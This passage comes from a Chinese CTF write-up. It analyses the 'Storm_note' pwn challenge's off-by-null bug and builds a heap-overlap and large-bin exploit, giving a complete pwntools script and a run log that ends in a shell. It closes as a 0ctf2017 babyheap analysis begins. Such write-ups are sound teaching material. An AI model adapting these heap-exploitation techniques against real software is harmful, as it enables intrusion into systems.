class="number">00000000002020</span>A0 ?? ?? ?? ?? ?? ??+_bss ends</span><br></pre></td></tr></table></figure>
<h3 id="edit-note"><a href="#edit-note" class="headerlink" title="edit_note"></a>edit_note</h3><p>edit 从 note 和 note_size 中根据索引取出需要编辑的堆块的指针和 size，使用 read 函数来进行输入。之后将末尾的值赋值为 0，这里存在 off by null 漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Index ?"</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  v2 = read(<span class="number">0</span>, (<span class="keyword">void</span> *)note[v1], (<span class="keyword">signed</span> <span class="keyword">int</span>)note_size[v1]);</span><br><span class="line">  *(_BYTE *)(note[v1] + v2) = <span class="number">0</span>; <span class="comment">// off-by-one</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h3><p>可以看到输入 index 之后程序 free 掉 note 和 note_size 之后做了清零操作，不存在UAF漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Index ?"</span>);</span><br><span class="line">_isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)note[v1]);</span><br><span class="line">  note[v1] = <span class="number">0L</span>L;</span><br><span class="line">  note_size[v1] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h3><p>可以看到system(“/bin/sh”);函数，函数首先读 0x30 长度，然后输入的内容和 mmap 段映射的内容相同即 getshell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"If you can open the lock, I will let you in"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;buf, (<span class="keyword">const</span> <span class="keyword">void</span> *)<span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL) )</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping/" target="_blank" rel="noopener">Chunk Extend</a> 使得chunk重叠</li>
<li>控制chunk</li>
<li>控制unsort bin和large bin</li>
<li>overlapping 伪造 fake_chunk</li>
<li>触发后门</li>
</ul>
<p>这里首先我们连续申请7块chunk，这里是三个一组，两组 chunk 中的中间一个大的 chunk 就是我们利用的目标，用它来进行 overlapping 并把它放进 largebin 中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 0</span></span><br><span class="line">alloc_note(<span class="number">0x508</span>)  <span class="comment"># 1</span></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 3</span></span><br><span class="line">alloc_note(<span class="number">0x508</span>)  <span class="comment"># 4</span></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 6</span></span><br></pre></td></tr></table></figure>
<p>布局如下图</p>
<p><img src="https://img-blog.csdnimg.cn/20190416222922114.png" alt="在这里插入图片描述"></p>
<p>然后我们伪造 prev_size</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 改pre_size为0x500</span></span><br><span class="line">edit_note(<span class="number">1</span>, <span class="string">'a'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))</span><br></pre></td></tr></table></figure>
<p>调试可以看到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/30gx 0x55dc2ede84f0</span><br><span class="line">0x55dc2ede84f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55dc2ede8500:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55dc2ede8510:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55dc2ede8520:	0x0000000000000500	0x0000000000000000 =&gt; fake prev_size</span><br><span class="line">0x55dc2ede8530:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55dc2ede8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede8550:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55dc2ede8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede8570:	0x0000000000000000	0x0000000000000511</span><br><span class="line">0x55dc2ede8580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede8590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede85a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede85b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede85c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55dc2ede85d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>释放掉chunk 1至unsort bin然后创建chunk 0来触发off by null，这里选择 size 为 0x18 的目的是为了能够填充到下一个 chunk 的 prev_size，这里就能通过溢出 00 到下一个 chunk 的 size 字段，使之低字节覆盖为 0。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># off by null 将1号块的size字段覆盖为0x500</span></span><br><span class="line">edit_note(<span class="number">0</span>, <span class="string">'b'</span>*(<span class="number">0x18</span>))</span><br></pre></td></tr></table></figure>
<p>调试可以看到chunk1已经被放进了 unsorted bin</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x562071ea0020-32</span><br><span class="line">0x562071ea0000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562071ea0010:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x562071ea0020:	0x6262626262626262	0x0000000000000500</span><br><span class="line">0x562071ea0030:	0x00007fe9f2875b78	0x00007fe9f2875b78</span><br><span class="line">0x562071ea0040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562071ea0050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x562071ea0060:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x562071ea0070:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x562071ea0080:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x562071ea0090:	0x6161616161616161	0x6161616161616161</span><br></pre></td></tr></table></figure>
<p>接下来我们申请两块chunk，因为关闭了 fastbin 机制，所以会从unsorted bin上，然后delete掉它们，那么就会触发这两个堆块合并，从而覆盖到刚刚的 0x4d8 这个块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alloc_note(<span class="number">0x18</span>)</span><br><span class="line">alloc_note(<span class="number">0x4d8</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">2</span>)  <span class="comment"># unlink进行前向extend</span></span><br></pre></td></tr></table></figure>
<p>调试如下，index为7的指向的地方和unsortedbin里面的chunk已经重叠了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x5564795ff000</span><br><span class="line">0x5564795ff000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5564795ff010:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x5564795ff020:	0x6262626262626262	0x0000000000000531</span><br><span class="line">0x5564795ff030:	0x00007f8305be4b78	0x00007f8305be4b78</span><br><span class="line">0x5564795ff040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5564795ff050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5564795ff060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5564795ff070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5564795ff080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5564795ff090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>alloc_note(0x30)之后2号块与7号块交叠，这里 add(0x30) 的 size 为 0x30 的原因是只需要控制 chunk7 的 fd 和 bk 指针</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc_note(0x30)  <span class="comment"># 1</span></span><br><span class="line">alloc_note(0x4e8)  <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>
<p>接下来的原理同上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">edit_note(<span class="number">4</span>, <span class="string">'a'</span>*(<span class="number">0x4f0</span>) + p64(<span class="number">0x500</span>))</span><br><span class="line">delete_note(<span class="number">4</span>)</span><br><span class="line">edit_note(<span class="number">3</span>, <span class="string">'a'</span>*(<span class="number">0x18</span>))</span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 4</span></span><br><span class="line">alloc_note(<span class="number">0x4d8</span>)  <span class="comment"># 8</span></span><br><span class="line">delete_note(<span class="number">4</span>)</span><br><span class="line">delete_note(<span class="number">5</span>)</span><br><span class="line">alloc_note(<span class="number">0x40</span>)  <span class="comment"># 4</span></span><br></pre></td></tr></table></figure>
<p>接下来需要我们控制 unsort bin 和 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#large-bin" target="_blank" rel="noopener">large bin</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">alloc_note(<span class="number">0x4e8</span>)    <span class="comment"># 2</span></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>由于unsorted bin是FIFO（队列模式），所以可以先删除2号块，再申请他，由于先检查队列尾部，也就是原先4号块的chunk部分，发现chunk大小不够大，然后将其放入large bin中。该chunk由8号块控制。然后，继续删除2号块，那么此时unsorted bin里还剩下2号块，该部分通过7号块来控制。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x55609685a000</span><br><span class="line">0x55609685a000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55609685a010:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x55609685a020:	0x6262626262626262	0x0000000000000041</span><br><span class="line">0x55609685a030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a060:	0x0000000000000000	0x00000000000004f1 =&gt; chunk 2</span><br><span class="line">0x55609685a070:	0x00007fec67d73b78	0x00007fec67d73b78 =&gt; unsorted bin</span><br><span class="line">0x55609685a080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gdb-peda$ x/20gx 0x55609685a570</span><br><span class="line">0x55609685a570:	0x6161616161616161	0x0000000000000051</span><br><span class="line">0x55609685a580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a5a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a5b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a5c0:	0x0000000000000000	0x00000000000004e1 =&gt; chunk 5</span><br><span class="line">0x55609685a5d0:	0x00007fec67d73f98	0x00007fec67d73f98</span><br><span class="line">0x55609685a5e0:	0x000055609685a5c0	0x000055609685a5c0</span><br><span class="line">0x55609685a5f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55609685a600:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>接下来我们伪造 fake_chunk，通过 chunk7 控制 chunk2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">content_addr = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk =  content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>)    <span class="comment"># size</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)         <span class="comment"># bk</span></span><br><span class="line">edit_note(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure>
<p>同样的通过 edit(8) 来控制 chunk5 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>)    <span class="comment"># size </span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)       </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>) </span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">8</span>,payload2)</span><br></pre></td></tr></table></figure>
<p>接下来我们需要触发后门</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit_note(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">8</span>)</span><br><span class="line">sh.sendline(<span class="string">'666'</span>)</span><br><span class="line">sh.sendline(<span class="string">'\x00'</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./Storm_note'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./Storm_note'</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc_note</span><span class="params">(size)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_note</span><span class="params">(idx, mes)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">'Content'</span>)</span><br><span class="line">    r.send(mes)</span><br><span class="line">    r.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 0</span></span><br><span class="line">alloc_note(<span class="number">0x508</span>)  <span class="comment"># 1</span></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 3</span></span><br><span class="line">alloc_note(<span class="number">0x508</span>)  <span class="comment"># 4</span></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">1</span>, <span class="string">'a'</span>*<span class="number">0x4f0</span> + p64(<span class="number">0x500</span>))</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">edit_note(<span class="number">0</span>, <span class="string">'b'</span>*(<span class="number">0x18</span>))</span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x18</span>)</span><br><span class="line">alloc_note(<span class="number">0x4d8</span>)</span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">alloc_note(<span class="number">0x30</span>)</span><br><span class="line">alloc_note(<span class="number">0x4e8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原理同上</span></span><br><span class="line">edit_note(<span class="number">4</span>, <span class="string">'a'</span>*(<span class="number">0x4f0</span>) + p64(<span class="number">0x500</span>))</span><br><span class="line">delete_note(<span class="number">4</span>)</span><br><span class="line">edit_note(<span class="number">3</span>, <span class="string">'a'</span>*(<span class="number">0x18</span>))</span><br><span class="line">alloc_note(<span class="number">0x18</span>)  <span class="comment"># 4</span></span><br><span class="line">alloc_note(<span class="number">0x4d8</span>)  <span class="comment"># 8</span></span><br><span class="line">delete_note(<span class="number">4</span>)</span><br><span class="line">delete_note(<span class="number">5</span>)</span><br><span class="line">alloc_note(<span class="number">0x40</span>)  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将2号块和4号块分别加入unsort bin和large bin</span></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">alloc_note(<span class="number">0x4e8</span>)    <span class="comment"># 2</span></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">content_addr = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk =  content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>)    <span class="comment"># size</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)         <span class="comment"># bk</span></span><br><span class="line">edit_note(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>)    <span class="comment"># size </span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)       </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>) </span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">8</span>,payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xabcd00f0</span></span><br><span class="line">alloc_note(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">8</span>)</span><br><span class="line">r.sendline(<span class="string">'666'</span>)</span><br><span class="line">r.sendline(<span class="string">'\x00'</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>运行结果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Thunder_J@Thunder_J-virtual-machine:~/桌面$ python exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./Storm_note'</span>: pid 16030</span><br><span class="line">[*] <span class="string">'/home/Thunder_J/\xe6\xa1\x8c\xe9\x9d\xa2/Storm_note'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">: If you can open the lock, I will <span class="built_in">let</span> you <span class="keyword">in</span></span><br><span class="line">$ ls</span><br><span class="line">exp.py    HITCON-Training  Storm_note  test.py  vmware-tools-distrib</span><br><span class="line">$ whoami</span><br><span class="line">Thunder_J</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[*] Process <span class="string">'./Storm_note'</span> stopped with <span class="built_in">exit</span> code 0 (pid 16030)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
<p><strong>参考链接</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] http://blog.eonew.cn/archives/709</span><br><span class="line">[+] https://blog.csdn.net/weixin_40850881/article/details/80293143</span><br></pre></td></tr></table></figure>
<h2 id="Some-Example"><a href="#Some-Example" class="headerlink" title="Some Example"></a>Some Example</h2><h3 id="0ctf2017-babyheap"><a href="#0ctf2017-babyheap" class="headerlink" title="0ctf2017 babyheap"></a>0ctf2017 babyheap</h3><p>这里从0ctf2017-babyheap这一道pwn题目入手，讲解pwn堆中的一些利用手法</p>
<p><a href="https://uaf.io/assets/0ctfbabyheap" target="_blank" rel="noopener">题目链接</a></p>
<p><strong>分析程序</strong></p>
<p>首先检查程序保护，所有的保护措施都是开启的，这意味着我们想要改写程序流程考虑从<code>malloc_hook</code>和<code>free_hook</code>入手</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/thunder/Desktop/codes/ctf/pwn/heap/0ctf_babyheap/0ctfbabyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p><code>sed -i s/alarm/isnan/g ./0ctfbabyheap</code>命令除去alarm函数，初步运行程序，有以下几个功能：</p>
<ol>
<li>申请chunk</li>
<li>填充chunk</li>
<li>销毁chunk</li>
<li>输出chunk</li>
<li>退出程序</li>
</ol>
